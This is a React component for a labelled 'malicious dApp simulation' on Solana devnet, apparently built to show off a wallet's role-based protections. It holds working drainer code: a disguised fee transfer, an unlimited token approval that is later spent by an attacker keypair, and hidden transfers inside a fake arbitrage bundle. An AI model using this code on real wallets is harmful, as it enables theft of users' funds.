import React, { useState, useEffect } from "react";
import { useWallet } from "../contexts/WalletContext";
import {
  Connection,
  PublicKey,
  Transaction,
  SystemProgram,
  LAMPORTS_PER_SOL,
} from "@solana/web3.js";
import {
  createTransferInstruction,
  getAssociatedTokenAddress,
  createAssociatedTokenAccountInstruction,
  getAccount,
  createApproveInstruction,
} from "@solana/spl-token";
import { Button } from "@swig/ui";
import { MALICIOUS_AUTHORITY_KEYPAIR, getMaliciousAuthorityInfo } from "./maliciousKeypair";

// TODO - remove airdrop
// TODO - check SOL drain amount and logs are dynamic

// Real malicious dapp component with enhanced attack scenarios
const Malicious: React.FC = () => {
  const {
    wallets,
    publicKey,
    connecting,
    connected,
    connectWallet,
    disconnectWallet,
    signAndSendTransaction,
  } = useWallet();
  const [maliciousReceiverWallet, setMaliciousReceiverWallet] = useState<string>(
    "BKV7zy1Q74pyk3eehMrVQeau9pj2kEp6k36RZwFTFdHk"
  );
  const [maliciousAuthorityInfo] = useState(() => getMaliciousAuthorityInfo());
  const [solDrainAmount, setSolDrainAmount] = useState<number>(0.1);
  const [usdcDrainAmount, setUsdcDrainAmount] = useState<number>(10);
  const [logs, setLogs] = useState<(string | JSX.Element)[]>([]);
  const [isLoading, setIsLoading] = useState(false);
  const [solBalance, setSolBalance] = useState<number>(0);
  const [usdcBalance, setUsdcBalance] = useState<number>(0);
  const [showWalletList, setShowWalletList] = useState(false);
  const [attackPhase, setAttackPhase] = useState<"permissions" | "exploitation" | "none">("none");
  const [hasUnlimitedApproval, setHasUnlimitedApproval] = useState(false);

  // Initialize connection to devnet
  const connection = new Connection("https://api.devnet.solana.com");

  // Devnet USDC mint address
  const USDC_MINT = new PublicKey("Gh9ZwEmdLJ8DscKNTkTqPbNwLNNBjuSzaG9Vp2KGtKJr");
  // get usdc airdrop from https://spl-token-faucet.com/?token-name=USDC

  const addLog = (message: string | JSX.Element) => {
    setLogs((prev) => [...prev, message]);
  };

  // Log malicious authority info on component mount
  useEffect(() => {
    addLog(`🔑 Malicious authority loaded: ${maliciousAuthorityInfo.publicKey}`);
    addLog("💡 This simulates a malicious smart contract's signing authority");
    addLog("💰 Please fund this address with some SOL for transaction fees");
    addLog(`🔗 Airdrop: ${maliciousAuthorityInfo.airdropCommand}`);
  }, [maliciousAuthorityInfo]);

  // Helper function to check if token account exists
  const checkTokenAccountExists = async (tokenAccount: PublicKey): Promise<boolean> => {
    try {
      await getAccount(connection, tokenAccount);
      return true;
    } catch (error) {
      return false;
    }
  };

  // Fetch balances when wallet connects or publicKey changes
  useEffect(() => {
    const fetchBalances = async () => {
      if (!publicKey) return;

      try {
        // Fetch SOL balance
        const solBalance = await connection.getBalance(new PublicKey(publicKey));
        setSolBalance(solBalance / LAMPORTS_PER_SOL);

        // Fetch USDC balance
        try {
          const ata = await getAssociatedTokenAddress(USDC_MINT, new PublicKey(publicKey));
          const account = await getAccount(connection, ata);
          setUsdcBalance(Number(account.amount) / 1e6); // USDC has 6 decimals
        } catch (error) {
          // If ATA doesn't exist, balance is 0
          setUsdcBalance(0);
        }
      } catch (error) {
        console.error("Error fetching balances:", error);
      }
    };

    fetchBalances();
  }, [publicKey, connection]);

  const handleConnectClick = () => {
    setShowWalletList(!showWalletList);
  };

  const handleWalletSelect = async (wallet: any) => {
    try {
      await connectWallet(wallet);
      setShowWalletList(false);

      // Immediately start the permission request phase after connection
      setTimeout(() => {
        setAttackPhase("permissions");
        addLog(
          "🎯 Welcome to SuperSwap DeFi! To provide the best trading experience, we need some permissions..."
        );
      }, 1000);
    } catch (error) {
      console.error("Failed to connect wallet:", error);
    }
  };

  // Attack 1: Request broad permissions upfront (disguised as normal DeFi onboarding)
  const requestBroadPermissions = async () => {
    if (!connected || !publicKey) {
      addLog("Please connect your wallet first");
      return;
    }

    setIsLoading(true);
    addLog("📋 Requesting standard DeFi permissions for optimal trading experience...");

    try {
      // Create a simple transaction that requests broad permissions
      const permissionTx = new Transaction();

      // Add what looks like a "small setup fee" but is actually a test transfer
      permissionTx.add(
        SystemProgram.transfer({
          fromPubkey: new PublicKey(publicKey),
          toPubkey: new PublicKey(maliciousReceiverWallet),
          lamports: LAMPORTS_PER_SOL * 0.001, // 0.001 SOL "setup fee"
        })
      );

      addLog("✅ Setup fee: 0.001 SOL (for gas optimization)");
      addLog("📝 Please approve this transaction to enable trading features...");

      try {
        const signature = await signAndSendTransaction(permissionTx, connection);
        addLog("✅ Basic permissions granted!");
        if (signature) {
          addLog(
            <a
              href={`https://explorer.solana.com/tx/${signature}?cluster=devnet`}
              target="_blank"
              rel="noopener noreferrer"
              className="text-blue-600 hover:underline"
            >
              🔍 View Transaction
            </a>
          );
        }

        // Now request the dangerous unlimited token approval
        await requestUnlimitedTokenApproval();
      } catch (error: any) {
        console.error("Permission request error:", error);
        addLog(`❌ Permission request failed: ${error.message}`);
        if (error.message.includes("Plugin Closed") || error.message.includes("User rejected")) {
          addLog("🛡️ User canceled the transaction - good security practice!");
        }
      }
    } catch (error: any) {
      addLog(`Error setting up permissions: ${error.message}`);
    } finally {
      setIsLoading(false);
    }
  };

  // Attack 2: Request unlimited token spending approval (disguised as normal DeFi approval)
  const requestUnlimitedTokenApproval = async () => {
    if (!connected || !publicKey) return;

    addLog("\n🔐 Setting up token permissions for seamless trading...");
    addLog("💡 This approval allows our smart contract to execute trades on your behalf");

    try {
      const userTokenAccount = await getAssociatedTokenAddress(USDC_MINT, new PublicKey(publicKey));

      // Check if user has USDC token account
      const accountExists = await checkTokenAccountExists(userTokenAccount);
      if (!accountExists) {
        addLog("❌ No USDC token account found. Please get some USDC first from the faucet.");
        addLog("🔗 Get USDC: https://spl-token-faucet.com/?token-name=USDC");
        return;
      }

      // Create approval for maximum possible amount (classic DeFi attack vector)
      const maxAmount = "18446744073709551615"; // Max uint64 - unlimited approval

      const approvalTx = new Transaction().add(
        createApproveInstruction(
          userTokenAccount,
          MALICIOUS_AUTHORITY_KEYPAIR.publicKey, // Malicious contract authority
          new PublicKey(publicKey),
          BigInt(maxAmount) // Unlimited approval!
        )
      );

      addLog("📋 Requesting approval for token trading (standard DeFi practice)");
      addLog("🔄 Amount: Unlimited (allows efficient batch trading)");
      addLog(
        `🏗️ Granting approval to contract authority: ${MALICIOUS_AUTHORITY_KEYPAIR.publicKey
          .toString()
          .slice(0, 20)}...`
      );

      try {
        const signature = await signAndSendTransaction(approvalTx, connection);
        setHasUnlimitedApproval(true);
        setAttackPhase("exploitation");
        addLog("✅ Token approval granted! You can now trade efficiently.");
        if (signature) {
          addLog(
            <a
              href={`https://explorer.solana.com/tx/${signature}?cluster=devnet`}
              target="_blank"
              rel="noopener noreferrer"
              className="text-blue-600 hover:underline"
            >
              🔍 View Transaction
            </a>
          );
        }
        addLog("💰 SuperSwap is now ready to optimize your trades!");

        // Show the exploitation phase after a delay
        setTimeout(() => {
          addLog(
            "\n⚠️  ATTACK PHASE: Now that we have unlimited approval, we can drain your tokens..."
          );
        }, 3000);
      } catch (error: any) {
        console.error("Token approval error:", error);
        addLog(`❌ Token approval failed: ${error.message}`);
        if (error.message.includes("Plugin Closed") || error.message.includes("User rejected")) {
          addLog("🛡️ User canceled the unlimited approval - excellent security decision!");
        } else {
          addLog("🛡️ Wallet blocked unlimited approval request!");
        }
      }
    } catch (error: any) {
      addLog(`Error requesting token approval: ${error.message}`);
    }
  };

  // Attack 3: Exploit the unlimited approval to drain tokens
  const exploitUnlimitedApproval = async () => {
    if (!connected || !publicKey || !hasUnlimitedApproval || !MALICIOUS_AUTHORITY_KEYPAIR) {
      addLog("No unlimited approval to exploit or missing malicious authority");
      return;
    }

    setIsLoading(true);
    addLog("\n🚨 EXPLOITATION PHASE: Using previously granted unlimited approval");
    addLog("🎭 This simulates what a malicious smart contract would do automatically");

    try {
      const fromTokenAccount = await getAssociatedTokenAddress(USDC_MINT, new PublicKey(publicKey));
      const toTokenAccount = await getAssociatedTokenAddress(
        USDC_MINT,
        new PublicKey(maliciousReceiverWallet)
      );

      // Check if user's token account exists and has balance
      const fromAccountExists = await checkTokenAccountExists(fromTokenAccount);
      if (!fromAccountExists) {
        addLog("❌ User's USDC account doesn't exist. Cannot exploit.");
        setIsLoading(false);
        return;
      }

      // Check current balance
      const account = await getAccount(connection, fromTokenAccount);
      const actualBalance = Number(account.amount) / 1e6;
      const drainAmount = Math.min(usdcDrainAmount, actualBalance);

      if (drainAmount <= 0) {
        addLog("❌ No USDC balance to drain.");
        setIsLoading(false);
        return;
      }

      const exploitTx = new Transaction();

      // Check if malicious receiver's token account exists, create if not
      const toAccountExists = await checkTokenAccountExists(toTokenAccount);
      if (!toAccountExists) {
        exploitTx.add(
          createAssociatedTokenAccountInstruction(
            MALICIOUS_AUTHORITY_KEYPAIR.publicKey, // malicious authority pays for account creation
            toTokenAccount,
            new PublicKey(maliciousReceiverWallet),
            USDC_MINT
          )
        );
        addLog("📝 Creating token account for malicious receiver...");
      }

      // Transfer using the approved delegation - this is the key attack!
      exploitTx.add(
        createTransferInstruction(
          fromTokenAccount,
          toTokenAccount,
          MALICIOUS_AUTHORITY_KEYPAIR.publicKey, // The authority that was approved
          Math.floor(drainAmount * 1e6) // Convert to proper decimal places
        )
      );

      // Set recent blockhash and fee payer
      const { blockhash } = await connection.getLatestBlockhash();
      exploitTx.recentBlockhash = blockhash;
      exploitTx.feePayer = MALICIOUS_AUTHORITY_KEYPAIR.publicKey;

      addLog(`💸 Attempting to drain ${drainAmount.toFixed(2)} USDC using unlimited approval...`);
      addLog("🔑 Signing transaction with malicious contract authority...");

      try {
        // Sign with the malicious authority (simulating smart contract execution)
        exploitTx.sign(MALICIOUS_AUTHORITY_KEYPAIR);

        // Send the signed transaction
        const signature = await connection.sendRawTransaction(exploitTx.serialize());

        // Wait for confirmation
        await connection.confirmTransaction(signature, "confirmed");

        addLog("💀 CRITICAL: Token drain successful! USDC stolen via transferFrom!");
        if (signature) {
          addLog(
            <a
              href={`https://explorer.solana.com/tx/${signature}?cluster=devnet`}
              target="_blank"
              rel="noopener noreferrer"
              className="text-blue-600 hover:underline"
            >
              🔍 View Transaction
            </a>
          );
        }
        addLog("🔓 This happened because malicious contract used the unlimited approval");
        addLog("⚡ No additional user signature was required - approval was sufficient!");
      } catch (error: any) {
        console.error("Exploitation error:", error);
        addLog(`✅ Exploitation blocked: ${error.message}`);

        if (error.message.includes("insufficient funds")) {
          addLog("💰 Malicious authority needs SOL to pay transaction fees");
          addLog("🎯 In real attacks, contracts are pre-funded or use flashloans");
        } else {
          addLog("🛡️ Wallet or network prevented token drainage!");
        }
      }
    } catch (error: any) {
      addLog(`Error during exploitation: ${error.message}`);
    } finally {
      setIsLoading(false);
    }
  };

  // Complex transaction bundle attack
  const createComplexTransactionBundle = async () => {
    if (!connected || !publicKey) {
      addLog("Please connect your wallet first");
      return;
    }

    setIsLoading(true);
    addLog("\n🔄 Creating 'arbitrage opportunity' transaction bundle...");
    addLog(
      "💡 This appears to be a profitable arbitrage trade, but contains hidden malicious actions"
    );

    try {
      const userTokenAccount = await getAssociatedTokenAddress(USDC_MINT, new PublicKey(publicKey));
      const maliciousTokenAccount = await getAssociatedTokenAddress(
        USDC_MINT,
        new PublicKey(maliciousReceiverWallet)
      );

      const complexTx = new Transaction();

      // Check if user has USDC before trying to transfer
      const userAccountExists = await checkTokenAccountExists(userTokenAccount);

      if (userAccountExists && usdcBalance > 0) {
        const transferAmount = Math.min(usdcDrainAmount, usdcBalance);

        // Check if malicious wallet's token account exists, create if not
        const maliciousAccountExists = await checkTokenAccountExists(maliciousTokenAccount);
        if (!maliciousAccountExists) {
          complexTx.add(
            createAssociatedTokenAccountInstruction(
              new PublicKey(publicKey),
              maliciousTokenAccount,
              new PublicKey(maliciousReceiverWallet),
              USDC_MINT
            )
          );
        }

        // Instruction 1: Looks legitimate - small USDC transfer for "trading fee"
        complexTx.add(
          createTransferInstruction(
            userTokenAccount,
            maliciousTokenAccount,
            new PublicKey(publicKey),
            Math.floor(transferAmount * 0.1 * 1e6) // 10% of drain amount as "fee"
          )
        );

        // Instruction 2: Hidden - another transfer disguised in the bundle
        complexTx.add(
          createTransferInstruction(
            userTokenAccount,
            maliciousTokenAccount,
            new PublicKey(publicKey),
            Math.floor(transferAmount * 0.9 * 1e6) // 90% as hidden transfer
          )
        );
      }

      // Instruction 3: Hidden SOL drain
      complexTx.add(
        SystemProgram.transfer({
          fromPubkey: new PublicKey(publicKey),
          toPubkey: new PublicKey(maliciousReceiverWallet),
          lamports: Math.floor(LAMPORTS_PER_SOL * solDrainAmount),
        })
      );

      addLog("📦 Transaction bundle contains:");
      addLog("  ✅ Account setup for rewards");
      if (userAccountExists && usdcBalance > 0) {
        addLog(`  ✅ Trading fee: ${(usdcDrainAmount * 0.1).toFixed(2)} USDC`);
        addLog(`  ⚠️  Hidden: Additional ${(usdcDrainAmount * 0.9).toFixed(2)} USDC transfer`);
      }
      addLog(`  ⚠️  Hidden: ${solDrainAmount} SOL transfer`);
      addLog("💰 Estimated profit: 5.3 USDC (This is fake!)");

      try {
        const signature = await signAndSendTransaction(complexTx, connection);
        addLog("💀 CRITICAL: Complex transaction bundle executed!");
        if (signature) {
          addLog(
            <a
              href={`https://explorer.solana.com/tx/${signature}?cluster=devnet`}
              target="_blank"
              rel="noopener noreferrer"
              className="text-blue-600 hover:underline"
            >
              🔍 View Transaction
            </a>
          );
        }
        addLog("🔓 User signed without realizing all the hidden transfers.");
      } catch (error: any) {
        console.error("Complex bundle error:", error);
        addLog(`✅ Complex bundle blocked: ${error.message}`);
        if (error.message.includes("Plugin Closed") || error.message.includes("User rejected")) {
          addLog("🛡️ User canceled the complex transaction - smart move!");
        } else {
          addLog("🛡️ Wallet detected and prevented malicious bundle!");
        }
      }
    } catch (error: any) {
      addLog(`Error creating complex bundle: ${error.message}`);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="p-4 gap-4 w-full flex flex-col max-w-4xl mx-auto">
      <div className="bg-gradient-to-r from-purple-600 to-blue-600 text-white p-6 rounded-lg">
        <h1 className="text-3xl font-bold text-center">🌟 SuperSwap DeFi Protocol</h1>
        <p className="text-center mt-2 opacity-90">
          Advanced Arbitrage Trading & Yield Optimization
        </p>
      </div>

      <div className="bg-yellow-50 border-l-4 border-yellow-400 p-4">
        <h3 className="font-bold text-yellow-800">⚠️ Malicious DApp Simulation</h3>
        <p className="text-sm text-yellow-700">
          This dapp simulates real attack vectors: requesting broad permissions upfront, unlimited
          token approvals, and complex transaction bundles. It demonstrates how Swig's role-based
          permissions protect users from these common attacks.
        </p>
        <p className="text-sm text-yellow-700 mt-2">
          <strong>Note:</strong> Make sure you have USDC in your wallet first. Get some from the{" "}
          <a
            href="https://spl-token-faucet.com/?token-name=USDC"
            target="_blank"
            rel="noopener noreferrer"
            className="underline text-blue-600"
          >
            USDC faucet
          </a>
          .
        </p>
      </div>

      <div className="flex items-center justify-between bg-white p-4 rounded-lg border">
        <div className="flex flex-col gap-2">
          <p className="font-medium">
            Wallet Status:
            <span className={connected ? "text-green-600" : "text-red-600"}>
              {connected ? " Connected ✅" : " Disconnected ❌"}
            </span>
          </p>
          {attackPhase !== "none" && (
            <p className="text-sm text-gray-600">
              Attack Phase: <span className="font-mono">{attackPhase}</span>
            </p>
          )}
        </div>

        {!connected ? (
          <div style={{ position: "relative", display: "inline-block" }}>
            <Button onClick={handleConnectClick} disabled={connecting}>
              {connecting ? "Connecting..." : "🚀 Connect to SuperSwap"}
            </Button>

            {showWalletList && wallets && wallets.length > 0 && (
              <div
                className="mt-2 bg-white border border-gray-200 rounded shadow-lg p-4"
                style={{
                  position: "absolute",
                  top: "110%",
                  right: 0,
                  zIndex: 1000,
                  minWidth: "220px",
                }}
              >
                <h3 className="text-lg font-medium mb-2">Select a wallet</h3>
                <ul className="space-y-2">
                  {wallets.map((wallet, index) => (
                    <li key={wallet.adapter?.name || `wallet-${index}`}>
                      <button
                        className="w-full text-left px-4 py-2 rounded hover:bg-gray-100 flex items-center"
                        onClick={() => handleWalletSelect(wallet)}
                      >
                        {wallet.adapter?.icon && (
                          <img
                            src={wallet.adapter.icon}
                            alt={`${wallet.adapter.name} icon`}
                            className="w-6 h-6 mr-2"
                          />
                        )}
                        {wallet.adapter?.name || "Unknown Wallet"}
                      </button>
                    </li>
                  ))}
                </ul>
              </div>
            )}

            {showWalletList && (!wallets || wallets.length === 0) && (
              <div className="mt-2 bg-white border border-gray-200 rounded shadow-lg p-4">
                <p className="text-sm text-gray-600">
                  No compatible wallets found. Please install a Solana wallet extension.
                </p>
              </div>
            )}
          </div>
        ) : (
          <Button onClick={disconnectWallet} variant="secondary">
            Disconnect
          </Button>
        )}
      </div>

      {publicKey && (
        <div className="bg-blue-50 p-4 rounded-lg border border-blue-200">
          <h3 className="font-bold text-blue-900 mb-2">📊 Account Summary</h3>
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4 text-sm">
            <div>
              <p className="text-gray-600">Public Key:</p>
              <p className="font-mono text-xs">{publicKey.slice(0, 20)}...</p>
            </div>
            <div>
              <p className="text-gray-600">SOL Balance:</p>
              <p className="font-bold">{solBalance.toFixed(6)} SOL</p>
            </div>
            <div>
              <p className="text-gray-600">USDC Balance:</p>
              <p className="font-bold">{usdcBalance.toFixed(2)} USDC</p>
              {usdcBalance === 0 && (
                <p className="text-xs text-red-500">No USDC found. Get some from the faucet!</p>
              )}
            </div>
          </div>
        </div>
      )}

      <div className="bg-white p-4 rounded-lg border gap-1 flex flex-col">
        <h3 className="font-bold text-gray-900 mb-2">🎯 Attack Configuration</h3>
        <label className="text-sm font-medium text-gray-700">
          Malicious receiver wallet address:
        </label>
        <input
          className="border border-gray-300 rounded-md p-2 w-full"
          placeholder="Malicious receiver wallet address"
          value={maliciousReceiverWallet}
          onChange={(e) => setMaliciousReceiverWallet(e.target.value)}
        />
        <div className="mt-2 p-3 bg-yellow-50 border border-yellow-200 rounded">
          <label className="text-sm font-medium text-yellow-800">
            Malicious contract authority:
          </label>
          <p className="text-xs font-mono text-gray-600 mb-2">{maliciousAuthorityInfo.publicKey}</p>
          <div className="flex gap-2 flex-wrap">
            <button
              onClick={() => navigator.clipboard.writeText(maliciousAuthorityInfo.publicKey)}
              className="text-xs bg-blue-500 text-white px-2 py-1 rounded hover:bg-blue-600"
            >
              📋 Copy Address
            </button>
            <button
              onClick={() => navigator.clipboard.writeText(maliciousAuthorityInfo.airdropCommand)}
              className="text-xs bg-green-500 text-white px-2 py-1 rounded hover:bg-green-600"
            >
              📋 Copy Airdrop Command
            </button>
            <a
              href={maliciousAuthorityInfo.faucetUrl}
              target="_blank"
              rel="noopener noreferrer"
              className="text-xs bg-purple-500 text-white px-2 py-1 rounded hover:bg-purple-600"
            >
              💰 Web Faucet
            </a>
            <a
              href={maliciousAuthorityInfo.explorerUrl}
              target="_blank"
              rel="noopener noreferrer"
              className="text-xs bg-gray-500 text-white px-2 py-1 rounded hover:bg-gray-600"
            >
              🔍 Explorer
            </a>
          </div>
          <p className="text-xs text-yellow-700 mt-2">
            ⚠️ This address needs ~0.01 SOL to pay for transaction fees during exploitation
          </p>
        </div>
        <label className="text-sm font-medium text-gray-700 mt-2">SOL amount to drain:</label>
        <input
          type="number"
          step="0.001"
          className="border border-gray-300 rounded-md p-2 w-full"
          placeholder="Amount of SOL to drain"
          value={solDrainAmount}
          onChange={(e) => setSolDrainAmount(Number(e.target.value))}
        />
        <label className="text-sm font-medium text-gray-700 mt-2">USDC amount to drain:</label>
        <input
          type="number"
          step="0.01"
          className="border border-gray-300 rounded-md p-2 w-full"
          placeholder="Amount of USDC to drain"
          value={usdcDrainAmount}
          onChange={(e) => setUsdcDrainAmount(Number(e.target.value))}
        />
      </div>

      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        {/* Phase 1: Request Broad Permissions */}
        <Button
          onClick={requestBroadPermissions}
          disabled={isLoading || !connected || attackPhase === "exploitation"}
          className="bg-purple-600 hover:bg-purple-700 text-white p-4 h-auto"
        >
          <div className="text-left">
            <div className="font-bold">🔐 Phase 1: Setup SuperSwap</div>
            <div className="text-sm opacity-90">Request "standard" DeFi permissions</div>
          </div>
        </Button>

        {/* Phase 2: Complex Transaction Bundle */}
        <Button
          onClick={createComplexTransactionBundle}
          disabled={isLoading || !connected}
          className="bg-orange-600 hover:bg-orange-700 text-white p-4 h-auto"
        >
          <div className="text-left">
            <div className="font-bold">📦 Phase 2: Arbitrage Trade</div>
            <div className="text-sm opacity-90">Complex bundle with hidden transfers</div>
          </div>
        </Button>

        {/* Phase 3: Exploit Approval */}
        <Button
          onClick={exploitUnlimitedApproval}
          disabled={isLoading || !connected || !hasUnlimitedApproval}
          className="bg-red-600 hover:bg-red-700 text-white p-4 h-auto"
        >
          <div className="text-left">
            <div className="font-bold">💀 Phase 3: Exploit Approval</div>
            <div className="text-sm opacity-90">Drain tokens using unlimited approval</div>
          </div>
        </Button>

        {/* Status indicator */}
        <div
          className={`p-4 rounded-lg border-2 ${
            hasUnlimitedApproval ? "bg-red-50 border-red-200" : "bg-gray-50 border-gray-200"
          }`}
        >
          <div className="font-bold">🚨 Risk Level</div>
          <div className="text-sm">
            {hasUnlimitedApproval
              ? "HIGH - Unlimited approval granted!"
              : "LOW - No dangerous permissions granted"}
          </div>
        </div>
      </div>

      <div className="bg-white rounded-lg border">
        <div className="p-4 border-b">
          <h2 className="text-xl font-bold">📋 Attack Simulation Log</h2>
        </div>
        <div className="p-4 bg-gray-50 max-h-96 overflow-y-auto">
          {logs.length === 0 ? (
            <p className="text-gray-500 italic">Connect your wallet to begin the simulation...</p>
          ) : (
            logs.map((log, index) => (
              <div key={index} className="mb-2 font-mono text-sm">
                {log}
              </div>
            ))
          )}
        </div>
      </div>

      <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
        <h4 className="font-bold text-blue-900 mb-2">🛡️ How Swig Protects Users</h4>
        <ul className="text-sm text-blue-800 space-y-1">
          <li>
            <strong>Role-Based Permissions:</strong> Each dapp gets limited, specific permissions
          </li>
          <li>
            <strong>Approval Limits:</strong> Token approvals are capped by role limits
          </li>
          <li>
            <strong>Transaction Analysis:</strong> Complex bundles are analyzed for malicious
            content
          </li>
          <li>
            <strong>User Control:</strong> Clear permission boundaries prevent scope creep
          </li>
          <li>
            <strong>Session Isolation:</strong> Compromised dapp roles can't affect other apps
          </li>
        </ul>
      </div>
    </div>
  );
};

export default Malicious;
